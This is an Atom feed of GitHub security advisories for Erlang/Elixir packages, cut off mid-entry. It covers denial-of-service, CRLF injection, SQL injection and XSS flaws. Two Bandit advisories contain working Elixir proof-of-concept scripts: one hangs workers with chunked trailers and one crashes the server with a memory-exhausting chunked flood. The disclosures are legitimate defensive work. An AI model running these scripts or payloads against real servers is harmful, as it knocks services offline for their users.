<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/erlang.rss</id>
    <title>Security Advisory for Erlang/Elixir packages hosted at hex.pm</title>
    <updated>2026-05-19T21:27:54.311Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Aerlang"/>
    <subtitle>Security Advisory for Erlang/Elixir packages hosted at hex.pm on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[cowboy] Cowboy: Unbounded buffer accumulation in multipart header parsing causes denial of service in cowboy]]></title>
        <id>https://github.com/advisories/GHSA-jfc2-q6qh-g5x8</id>
        <link href="https://github.com/advisories/GHSA-jfc2-q6qh-g5x8"/>
        <updated>2026-05-19T20:12:34.000Z</updated>
        <content type="html"><![CDATA[<p>Allocation of Resources Without Limits or Throttling vulnerability in ninenines cowboy allows denial of service via unbounded buffer accumulation in multipart header parsing.</p>
<p>cowboy_req:read_part/3 in src/cowboy_req.erl accumulates incoming request bytes into a Buffer binary with no upper-bound check. When cow_multipart:parse_headers/2 returns more or {more, Buffer2}, the function reads up to Length bytes (default 64 KB) from the request body and recurses with the enlarged buffer. There is no equivalent of the byte_size(Acc) &gt; Length guard present in the sibling function read_part_body/4. An unauthenticated attacker can send a multipart/form-data request whose body never yields a complete header section — for example, a body that never contains the advertised boundary delimiter, or one whose header lines never contain \r\n\r\n — and force the server process to accumulate memory linearly with the bytes the protocol layer is willing to deliver. A handful of concurrent such uploads is sufficient to exhaust BEAM memory.</p>
<p>This issue affects cowboy from 2.0.0 before 2.15.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8466">https://nvd.nist.gov/vuln/detail/CVE-2026-8466</a></li>
<li><a href="https://github.com/ninenines/cowboy/commit/5c6a2061b41bb5771c4659fac7d5a822dca5bafb">https://github.com/ninenines/cowboy/commit/5c6a2061b41bb5771c4659fac7d5a822dca5bafb</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-8466.html">https://cna.erlef.org/cves/CVE-2026-8466.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-8466">https://osv.dev/vulnerability/EEF-CVE-2026-8466</a></li>
<li><a href="https://github.com/advisories/GHSA-jfc2-q6qh-g5x8">https://github.com/advisories/GHSA-jfc2-q6qh-g5x8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jfc2-q6qh-g5x8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-13T21:32:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cowlib] cowlib: Decompression Bomb in cow_spdy:inflate/2 Allows Memory Exhaustion via Crafted SPDY Frame]]></title>
        <id>https://github.com/advisories/GHSA-84f2-rp86-235p</id>
        <link href="https://github.com/advisories/GHSA-84f2-rp86-235p"/>
        <updated>2026-05-19T20:12:02.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Handling of Highly Compressed Data (Data Amplification) vulnerability in ninenines cowlib allows unauthenticated remote denial of service via memory exhaustion.</p>
<p>cow_spdy:inflate/2 in cowlib passes peer-supplied compressed bytes directly to zlib:inflate/2 with no output size bound. The SPDY header compression dictionary (?ZDICT) is public, and zlib compresses long runs of repeated bytes at roughly 1024:1, so a few kilobytes of SPDY frame payload can decompress to gigabytes on the BEAM heap, OOM-killing the node. A single unauthenticated SPDY frame is sufficient to trigger the condition. The parsers for syn_stream, syn_reply, and headers frame types are all affected via cow_spdy:parse_headers/2.</p>
<p>This issue affects cowlib from 0.1.0 before 2.16.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43970">https://nvd.nist.gov/vuln/detail/CVE-2026-43970</a></li>
<li><a href="https://github.com/ninenines/cowlib/commit/16aad3fb9f81f5cda4d1706ff0c54237c619c282">https://github.com/ninenines/cowlib/commit/16aad3fb9f81f5cda4d1706ff0c54237c619c282</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-43970.html">https://cna.erlef.org/cves/CVE-2026-43970.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-43970">https://osv.dev/vulnerability/EEF-CVE-2026-43970</a></li>
<li><a href="https://github.com/advisories/GHSA-84f2-rp86-235p">https://github.com/advisories/GHSA-84f2-rp86-235p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-84f2-rp86-235p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-13T21:32:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bandit] Bandit: Unauthenticated DoS via chunked request trailers in Bandit HTTP/1 decoder]]></title>
        <id>https://github.com/advisories/GHSA-rf5q-vwxw-gmrf</id>
        <link href="https://github.com/advisories/GHSA-rf5q-vwxw-gmrf"/>
        <updated>2026-05-19T19:25:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A worker-pinning denial of service in Bandit's HTTP/1 chunked transfer decoder. Any unauthenticated client that sends a <code>Transfer-Encoding: chunked</code> request whose body ends with a trailer field (RFC 9112 §7.1.2 explicitly permits this) causes the connection's worker process to spin forever in an infinite recursion. A handful of concurrent connections are sufficient to exhaust the listener pool and render the server unresponsive to all further traffic.</p>
<p>The vulnerability was likely introduced with this commit on <code>Dec 6, 2024</code>: <a href="https://github.com/mtrudel/bandit/commit/e73e379ab59840e8561b5730878f16e29ab06217">https://github.com/mtrudel/bandit/commit/e73e379ab59840e8561b5730878f16e29ab06217</a></p>
<h3 id="details">Details</h3>
<p>The bug is in <code>lib/bandit/http1/socket.ex</code> in <code>do_read_chunked_data!/5</code> (around lines 242–274). The terminator clause matches only <code>["0", "\r\n" &lt;&gt; rest]</code> — i.e. the last-chunk line <code>0\r\n</code> followed <em>immediately</em> by the empty trailer line. RFC 9112 §7.1.2 allows zero or more trailer fields between <code>0\r\n</code> and the final <code>\r\n</code>, e.g. a body ending <code>0\r\nX-T: v\r\n\r\n</code>.</p>
<p>When trailers are present, <code>:binary.split/2</code> returns <code>["0", "X-T: v\r\n\r\n"]</code>. The terminator clause does not match. The inner <code>&lt;&lt;_::binary-size(0), ?\r, ?\n, _::binary&gt;&gt;</code> pattern also does not match because <code>rest</code> starts with <code>X</code>. Execution falls into the <code>_ -&gt;</code> arm, which computes <code>to_read = 0 - byte_size(rest)</code> (a negative number) and calls <code>read_available!/2</code> on the socket. On timeout, <code>read_available!/2</code> returns <code>&lt;&lt;&gt;&gt;</code>, leaving the buffer unchanged. <code>do_read_chunked_data!/5</code> then tail-recurses with the same state and makes no forward progress. The worker is pinned for the lifetime of the TCP connection.</p>
<p>The same shape applies to malformed chunk frames where the declared chunk-size disagrees with the actual data length: the binary-size pattern cannot match and <code>read_available!</code> is repeatedly called with no progress.</p>
<p>The gap is acknowledged in the source itself — the comment on line 245 reads: <em>"We should be reading (and ignoring) trailers here"</em>.</p>
<p><strong>Suggested fix:</strong> after the <code>0</code> size line, consume bytes up to <code>\r\n\r\n</code> (parsing/discarding trailers via <code>:erlang.decode_packet(:httph_bin, …)</code>) before returning. Additionally, ensure every recursive arm makes forward progress — when <code>read_available!/2</code> returns <code>&lt;&lt;&gt;&gt;</code>, raise <code>request_error!(:request_timeout)</code> rather than re-entering with an unchanged buffer.</p>
<h3 id="poc">PoC</h3>
<p>A self-contained reproduction script is available below. It starts Bandit 1.10 on <code>127.0.0.1:4321</code> with a trivial echo Plug, opens a TCP connection, and sends a single chunked POST whose body is:</p>
<ul>
<li>one 5-byte chunk <code>"hello"</code></li>
<li>the last-chunk marker <code>0\r\n</code></li>
<li>one trailer field <code>X-Trailer: 1\r\n</code></li>
<li>the terminating <code>\r\n</code></li>
</ul>
<p>The request is fully RFC-conformant; many fronting proxies (NGINX, HAProxy) emit this exact shape when forwarding trailer-bearing requests. A correct server responds within milliseconds. With the bug, <code>:gen_tcp.recv/3</code> times out after 10 seconds because the worker is stuck spinning in <code>do_read_chunked_data!/5</code>.</p>
<p>Steps to reproduce:</p>
<ol>
<li><code>elixir script.exs</code></li>
<li>Observe the <code>TIMEOUT — worker is pinned in do_read_chunked_data!/5</code> log line.</li>
<li>Each additional concurrent client sending the same request consumes one more worker process.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Unauthenticated denial of service against any Bandit-fronted HTTP/1 service that accepts chunked request bodies — the default for Phoenix and Plug applications. No authentication, no special headers, and no large payload are required; a small number of attacker-controlled connections is enough to exhaust the worker pool and make the server unreachable for all users. Servers sitting behind proxies that legitimately forward trailer-bearing requests can also be affected without any malicious client involvement.</p>
<h3 id="script-and-logs">Script and Logs</h3>
<pre><code class="language-elixir"># Bandit HTTP/1 chunked decoder hangs on requests with trailer headers.
#
# lib/bandit/http1/socket.ex:242-274 (do_read_chunked_data!/5) terminates
# only when the last-chunk line `0\r\n` is followed *immediately* by the
# empty trailer line `\r\n`. RFC 9112 §7.1.2 allows trailer fields between
# them (e.g. `0\r\nX-T: v\r\n\r\n`). With trailers present, none of the
# match clauses fit: the `_` arm computes `to_read = 0 - byte_size(rest)`
# (negative), calls read_available!/2, gets &lt;&lt;&gt;&gt; on timeout, and recurses
# with the same buffer forever — pinning the worker for the connection's
# lifetime. The line 245 comment ("We should be reading (and ignoring)
# trailers here") acknowledges the gap.
#
# This script starts Bandit 1.10 on 127.0.0.1:4321, sends one chunked POST
# whose body ends with a single trailer field, and waits for a response.
# A correct server replies in milliseconds; the buggy decoder never does.
#
# Run: elixir script.exs

Mix.install([
  {:bandit, "~&gt; 1.10"},
  {:plug, "~&gt; 1.19"}
])

defmodule EchoApp do
  @behaviour Plug
  def init(opts), do: opts

  def call(conn, _opts) do
    {:ok, body, conn} = Plug.Conn.read_body(conn)
    Plug.Conn.send_resp(conn, 200, "got #{byte_size(body)} bytes")
  end
end

defmodule TrailerHang do
  @port 4321
  @recv_timeout_ms 10_000

  def run do
    {:ok, _} = Bandit.start_link(plug: EchoApp, ip: {127, 0, 0, 1}, port: @port)

    {:ok, sock} = :gen_tcp.connect(~c"127.0.0.1", @port, [:binary, active: false])

    request = build_chunked_request_with_trailer()
    log("Sending chunked POST whose body ends with `0\\r\\nX-Trailer: 1\\r\\n\\r\\n`.")
    :ok = :gen_tcp.send(sock, request)

    log("Waiting up to #{div(@recv_timeout_ms, 1000)}s for a response (a correct server replies in ms)…")
    started_at = System.monotonic_time(:millisecond)

    case :gen_tcp.recv(sock, 0, @recv_timeout_ms) do
      {:ok, response} -&gt;
        elapsed = System.monotonic_time(:millisecond) - started_at
        log("Got response after #{elapsed}ms — server handles trailers correctly:")
        IO.puts(binary_part(response, 0, min(byte_size(response), 256)))

      {:error, :timeout} -&gt;
        log("TIMEOUT — worker is pinned in do_read_chunked_data!/5.")
        log("Each concurrent client sending this shape consumes one Bandit worker.")

      {:error, reason} -&gt;
        log("Connection error: #{inspect(reason)}")
    end

    :gen_tcp.close(sock)
  end

  # Body: one 5-byte chunk "hello", last-chunk marker `0\r\n`, one trailer
  # `X-Trailer: 1\r\n`, terminating `\r\n`. RFC-conformant; many proxies
  # (NGINX, HAProxy) emit this shape when forwarding trailer-bearing
  # responses or requests.
  defp build_chunked_request_with_trailer do
    "POST / HTTP/1.1\r\n" &lt;&gt;
      "Host: 127.0.0.1:#{@port}\r\n" &lt;&gt;
      "Transfer-Encoding: chunked\r\n" &lt;&gt;
      "Trailer: X-Trailer\r\n" &lt;&gt;
      "Content-Type: application/octet-stream\r\n" &lt;&gt;
      "\r\n" &lt;&gt;
      "5\r\nhello\r\n" &lt;&gt;
      "0\r\n" &lt;&gt;
      "X-Trailer: 1\r\n" &lt;&gt;
      "\r\n"
  end

  defp log(message), do: IO.puts("[#{Time.utc_now() |&gt; Time.truncate(:millisecond)}] #{message}")
end

TrailerHang.run()
</code></pre>
<pre><code class="language-logs">12:36:54.260 [info] Running EchoApp with Bandit 1.10.4 at 127.0.0.1:4321 (http)
[10:36:54.275] Sending chunked POST whose body ends with `0\r\nX-Trailer: 1\r\n\r\n`.
[10:36:54.276] Waiting up to 10s for a response (a correct server replies in ms)…
[10:37:04.276] TIMEOUT — worker is pinned in do_read_chunked_data!/5.
[10:37:04.276] Each concurrent client sending this shape consumes one Bandit worker.
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mtrudel/bandit/security/advisories/GHSA-rf5q-vwxw-gmrf">https://github.com/mtrudel/bandit/security/advisories/GHSA-rf5q-vwxw-gmrf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39806">https://nvd.nist.gov/vuln/detail/CVE-2026-39806</a></li>
<li><a href="https://github.com/mtrudel/bandit/commit/ae3520dfdbfab115c638f8c7f6f6b805db34e1ab">https://github.com/mtrudel/bandit/commit/ae3520dfdbfab115c638f8c7f6f6b805db34e1ab</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-39806.html">https://cna.erlef.org/cves/CVE-2026-39806.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-39806">https://osv.dev/vulnerability/EEF-CVE-2026-39806</a></li>
<li><a href="https://github.com/advisories/GHSA-rf5q-vwxw-gmrf">https://github.com/advisories/GHSA-rf5q-vwxw-gmrf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rf5q-vwxw-gmrf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T19:25:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bandit] Bandit: Unauthenticated one-shot DoS via `Transfer-Encoding: chunked`]]></title>
        <id>https://github.com/advisories/GHSA-9q9q-324x-93r2</id>
        <link href="https://github.com/advisories/GHSA-9q9q-324x-93r2"/>
        <updated>2026-05-19T19:23:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Bandit's HTTP/1 chunked-body reader silently drops the request size cap that the application configures (e.g. <code>Plug.Parsers</code>' default 8 MB <code>length:</code>) and buffers the entire body in memory before the application sees it. An unauthenticated attacker can crash any Bandit-fronted Phoenix/Plug app (BEAM OOM) with a single <code>Transfer-Encoding: chunked</code> request to any URL.</p>
<h3 id="details">Details</h3>
<p>In <code>lib/bandit/http1/socket.ex:189</code>, the chunked clause of <code>read_data/2</code> only forwards <code>:read_length</code> and <code>:read_timeout</code> to <code>do_read_chunked_data!/5</code> (<code>:242</code>); the caller-supplied <code>:length</code> cap is dropped. The recursion accumulates every chunk into an iolist and <code>IO.iodata_to_binary/1</code> (<code>:196</code>) materializes the whole thing as one binary. The function always returns <code>{:ok, body, ...}</code> — never <code>{:more, ...}</code> — so callers cannot interpose a 413.</p>
<p>The content-length sibling at <code>:210</code> does the right thing:</p>
<pre><code class="language-elixir">max_to_return = min(unread_content_length, Keyword.get(opts, :length, 8_000_000))
</code></pre>
<p>Because <code>Plug.Parsers</code> runs before routing and auth in the standard Phoenix endpoint, the attacker needs no credentials and no valid route — any <code>Content-Type</code> matching a configured parser (<code>:json</code>, <code>:urlencoded</code>, <code>:multipart</code>) on any path triggers the bug.</p>
<p><strong>Suggested Fix:</strong> track accumulated bytes in <code>do_read_chunked_data!</code> and either return <code>{:more, ...}</code> or raise <code>request_error!</code> once <code>:length</code> is exceeded, mirroring the content-length path.</p>
<h3 id="poc">PoC</h3>
<p>Self-contained — boots a Bandit server with a realistic <code>Plug.Parsers</code> (<code>length: 8_000_000</code>) and floods it. Save as <code>chunked_oom.exs</code>, run <code>elixir chunked_oom.exs</code>, and watch <code>beam.smp</code> RSS climb past 8 MB until the OS OOM-killer fires.</p>
<pre><code class="language-elixir">Mix.install([{:bandit, "~&gt; 1.10"}, {:plug, "~&gt; 1.19"}])

defmodule DemoApp do
  use Plug.Builder

  # The `length` option here is ignored by the attack
  plug Plug.Parsers, parsers: [:urlencoded, :json], pass: ["*/*"], json_decoder: JSON, length: 8_000_000
  plug :respond

  def respond(conn, _), do: Plug.Conn.send_resp(conn, 200, "ok")
end

{:ok, _} = Bandit.start_link(plug: DemoApp, ip: {127, 0, 0, 1}, port: 4321)

# Builds a single 1MB chunk that is reused on the client-side but accumulated on the server-side.
chunk = :binary.copy(&lt;&lt;?A&gt;&gt;, 1_048_576)
frame = "#{Integer.to_string(1_048_576, 16)}\r\n#{chunk}\r\n"

{:ok, sock} = :gen_tcp.connect(~c"127.0.0.1", 4321, [:binary, active: false])

:ok =
  :gen_tcp.send(sock, """
  POST / HTTP/1.1\r
  Host: 127.0.0.1\r
  Transfer-Encoding: chunked\r
  Content-Type: application/json\r
  Connection: close\r
  \r
  """)

Enum.each(1..10_240, fn _ -&gt; :ok = :gen_tcp.send(sock, frame) end)
:ok = :gen_tcp.send(sock, "0\r\n\r\n")

IO.inspect(:gen_tcp.recv(sock, 0, 120_000))
</code></pre>
<h3 id="impact">Impact</h3>
<p>Unauthenticated pre-route DoS via BEAM memory exhaustion. One request from one connection crashes the server. Affects every Bandit-fronted application that reads request bodies anywhere — i.e. essentially every Phoenix app, since the default endpoint mounts <code>Plug.Parsers</code> ahead of routing and auth. Configured <code>length:</code> caps on <code>Plug.Parsers</code> and <code>Plug.Conn.read_body/2</code> are silently ineffective on the chunked path.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mtrudel/bandit/security/advisories/GHSA-9q9q-324x-93r2">https://github.com/mtrudel/bandit/security/advisories/GHSA-9q9q-324x-93r2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39803">https://nvd.nist.gov/vuln/detail/CVE-2026-39803</a></li>
<li><a href="https://github.com/mtrudel/bandit/commit/ae3520dfdbfab115c638f8c7f6f6b805db34e1ab">https://github.com/mtrudel/bandit/commit/ae3520dfdbfab115c638f8c7f6f6b805db34e1ab</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-39803.html">https://cna.erlef.org/cves/CVE-2026-39803.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-39803">https://osv.dev/vulnerability/EEF-CVE-2026-39803</a></li>
<li><a href="https://github.com/advisories/GHSA-9q9q-324x-93r2">https://github.com/advisories/GHSA-9q9q-324x-93r2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9q9q-324x-93r2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T19:23:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[postgrex] Postgrex: Channel-name SQL injection in `Postgrex.Notifications.listen/3`]]></title>
        <id>https://github.com/advisories/GHSA-r73h-97w8-m54h</id>
        <link href="https://github.com/advisories/GHSA-r73h-97w8-m54h"/>
        <updated>2026-05-18T17:53:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>SQL injection in <code>Postgrex.Notifications.listen/3</code>: the <code>channel</code> argument is interpolated straight into <code>LISTEN "..."</code> / <code>UNLISTEN "..."</code> without escaping the <code>"</code> character. Any caller that lets a user influence the channel name (e.g. a pub/sub bridge that uses a tenant id or topic slug as the channel) and the name is not sanitized can execute arbitrary SQL on the notifications connection.</p>
<p>Only those using the <code>Postgrex.Notifications</code> directly or via a dependency, with a non-sanitized channel name are vulnerable. Ecto does not use Postgrex.Notifications by default, but you must validate if any other dependency does.</p>
<h3 id="details">Details</h3>
<p>PostgreSQL escapes a <code>"</code> inside a quoted identifier by doubling it to <code>""</code>. Postgrex doesn't do that doubling, so a <code>"</code> inside <code>channel</code> closes the identifier early and everything after it is parsed as SQL on the same connection.</p>
<p>The notifications connection runs as whatever DB role the app is configured with. Unlike the <code>Postgrex.query/4</code> API, there's no extended-protocol guard here: <code>LISTEN</code>/<code>UNLISTEN</code> are sent as simple queries, so multi-statement payloads work and the attacker can chain <code>; CREATE TABLE …</code>, <code>; DROP …</code>, <code>; CREATE ROLE …</code>, etc.</p>
<h3 id="impact">Impact</h3>
<p>SQL injection on the notifications connection. Affects any application that calls <code>Postgrex.Notifications.listen/3</code> (or <code>unlisten/3</code>) with a channel name derived from untrusted input. Executes as the configured DB user with no protocol-level limit on what can be chained, so the realistic blast radius is read/modify/destroy on any data the app's DB role can reach.</p>
<h3 id="fix">Fix</h3>
<p>Upgrade to latest Postgrex v0.22.2 or later. Altenratively, sanitize any user input given as channel name by making sure it doesn't include quotes as well as null bytes (not strictly required, but recommended):</p>
<pre><code class="language-elixir">if String.contains?(channel_name, ["\"", "\0"]) do
  raise "bad channel name"
end
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/elixir-ecto/ecto/security/advisories/GHSA-r73h-97w8-m54h">https://github.com/elixir-ecto/ecto/security/advisories/GHSA-r73h-97w8-m54h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32687">https://nvd.nist.gov/vuln/detail/CVE-2026-32687</a></li>
<li><a href="https://github.com/elixir-ecto/postgrex/commit/7cdedbd4316bb65f82e6a9a4f922c0ac491cb770">https://github.com/elixir-ecto/postgrex/commit/7cdedbd4316bb65f82e6a9a4f922c0ac491cb770</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-32687.html">https://cna.erlef.org/cves/CVE-2026-32687.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-32687">https://osv.dev/vulnerability/EEF-CVE-2026-32687</a></li>
<li><a href="https://github.com/advisories/GHSA-r73h-97w8-m54h">https://github.com/advisories/GHSA-r73h-97w8-m54h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r73h-97w8-m54h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-18T17:53:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cowlib] cowlib: Cookie Request Header Injection via Unvalidated Encoder in cow_cookie:cookie/1]]></title>
        <id>https://github.com/advisories/GHSA-g2wm-735q-3f56</id>
        <link href="https://github.com/advisories/GHSA-g2wm-735q-3f56"/>
        <updated>2026-05-18T17:48:35.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Neutralization of CRLF Sequences ('CRLF Injection') vulnerability in ninenines cowlib allows HTTP request splitting and cookie smuggling via unvalidated cookie name and value fields.</p>
<p>cow_cookie:cookie/1 in cowlib builds a client-side Cookie: request header from a list of name-value pairs without validating either field. An attacker who controls the cookie names or values passed to this function can inject ;, ,, CR, LF, or TAB characters into the serialized header. This enables two classes of attack: cookie smuggling within a single header (e.g. injecting "; admin=1" to introduce a phantom cookie that the receiving server treats as authentic) and HTTP request header splitting (injecting CRLF to append arbitrary headers or smuggle a complete second request against a shared upstream proxy). The decoder side (parse_cookie_name/1, parse_cookie_value/1) and setcookie/3 already validate and reject these characters; the encoder alone is missing the check.</p>
<p>This issue affects cowlib from 2.9.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43969">https://nvd.nist.gov/vuln/detail/CVE-2026-43969</a></li>
<li><a href="https://github.com/erlef/cowlib/commit/177953dd51540da11090666c1f007214127a1144">https://github.com/erlef/cowlib/commit/177953dd51540da11090666c1f007214127a1144</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-43969.html">https://cna.erlef.org/cves/CVE-2026-43969.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-43969">https://osv.dev/vulnerability/EEF-CVE-2026-43969</a></li>
<li><a href="https://github.com/advisories/GHSA-g2wm-735q-3f56">https://github.com/advisories/GHSA-g2wm-735q-3f56</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g2wm-735q-3f56</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-11T21:31:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cowlib]  cowlib cow_http_te module: Uncontrolled Resource Consumption vulnerability allows Excessive Allocation]]></title>
        <id>https://github.com/advisories/GHSA-32p9-57cr-4x65</id>
        <link href="https://github.com/advisories/GHSA-32p9-57cr-4x65"/>
        <updated>2026-05-18T16:49:22.000Z</updated>
        <content type="html"><![CDATA[<p>Uncontrolled Resource Consumption vulnerability in ninenines cowlib (cow_http_te module) allows Excessive Allocation.</p>
<p>The chunked transfer-encoding parser in cow_http_te accepts an unbounded number of hex digits in the chunk-size field. Each digit causes a bignum multiplication (Len * 16 + digit), so parsing N hex digits requires O(N²) CPU work and O(N) memory. Additionally, when input is drip-fed, the parser discards the accumulated length on each partial read and restarts from zero on resumption, raising the cost to O(N³). An unauthenticated remote attacker can exploit this by sending an HTTP/1.1 request with Transfer-Encoding: chunked and a very long chunk-size hex string to cause denial of service through CPU exhaustion and memory amplification.</p>
<p>This vulnerability is associated with program file src/cow_http_te.erl and program routines cow_http_te:stream_chunked/2, cow_http_te:chunked_len/4.</p>
<p>This issue affects cowlib: from 0.6.0 before 2.16.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7790">https://nvd.nist.gov/vuln/detail/CVE-2026-7790</a></li>
<li><a href="https://github.com/ninenines/cowlib/commit/a4b8039ce8c93ab00867ef6b7e888822c09f4369">https://github.com/ninenines/cowlib/commit/a4b8039ce8c93ab00867ef6b7e888822c09f4369</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-7790.html">https://cna.erlef.org/cves/CVE-2026-7790.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-7790">https://osv.dev/vulnerability/EEF-CVE-2026-7790</a></li>
<li><a href="https://github.com/ninenines/cowlib/releases/tag/2.16.1">https://github.com/ninenines/cowlib/releases/tag/2.16.1</a></li>
<li><a href="https://github.com/advisories/GHSA-32p9-57cr-4x65">https://github.com/advisories/GHSA-32p9-57cr-4x65</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-32p9-57cr-4x65</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-11T21:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cowlib] ninenines cowlib: Improper Neutralization of CRLF Sequences ('CRLF Injection') vulnerability allows SSE event splitting and injection via unvalidated field values]]></title>
        <id>https://github.com/advisories/GHSA-hv23-4qp7-8c8r</id>
        <link href="https://github.com/advisories/GHSA-hv23-4qp7-8c8r"/>
        <updated>2026-05-18T16:47:11.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Neutralization of CRLF Sequences ('CRLF Injection') vulnerability in ninenines cowlib allows SSE event splitting and injection via unvalidated field values.</p>
<p>cow_sse:event/1 in cowlib guards the id and event fields against \n but not against bare \r, and the internal prefix_lines/2 function used for data and comment fields splits only on \n. Because the SSE specification requires decoders to treat \r\n, \r, and \n as equivalent line terminators, an attacker who controls any of these fields can inject additional SSE lines and forge a complete event with an arbitrary event type and data payload on the receiving end. In typical deployments where browser EventSource clients or other SSE consumers dispatch on event.type and render event.data, this enables event splitting, client-side logic manipulation, and stored-XSS-equivalent behaviour when event data is inserted into the DOM.</p>
<p>This issue affects cowlib from 2.6.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43968">https://nvd.nist.gov/vuln/detail/CVE-2026-43968</a></li>
<li><a href="https://github.com/ninenines/cowlib/commit/6165fc40efa159ba1cceee7e7981e790acba5d9c">https://github.com/ninenines/cowlib/commit/6165fc40efa159ba1cceee7e7981e790acba5d9c</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-43968.html">https://cna.erlef.org/cves/CVE-2026-43968.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-43968">https://osv.dev/vulnerability/EEF-CVE-2026-43968</a></li>
<li><a href="https://github.com/ninenines/cowlib/releases/tag/2.16.1">https://github.com/ninenines/cowlib/releases/tag/2.16.1</a></li>
<li><a href="https://github.com/advisories/GHSA-hv23-4qp7-8c8r">https://github.com/advisories/GHSA-hv23-4qp7-8c8r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hv23-4qp7-8c8r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-11T21:31:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[absinthe_plug] absinthe_plug Has a Cross-site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-c62g-j346-39v5</id>
        <link href="https://github.com/advisories/GHSA-c62g-j346-39v5"/>
        <updated>2026-05-14T13:09:29.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Neutralization of Input During Web Page Generation (XSS) vulnerability in absinthe-graphql absinthe_plug allows reflected cross-site scripting via the GraphiQL interface.</p>
<p>'Elixir.Absinthe.Plug.GraphiQL':js_escape/1 in lib/absinthe/plug/graphiql.ex escapes single quotes and newlines in the query GET parameter before embedding it in an inline JavaScript string, but does not escape backslashes. An attacker can bypass the escaping by prefixing a quote with a backslash (e.g. '), breaking out of the string context and executing arbitrary JavaScript in the victim's browser.</p>
<p>This issue affects absinthe_plug: from 1.2.0.</p>
<h3 id="references">References</h3>
<ul>
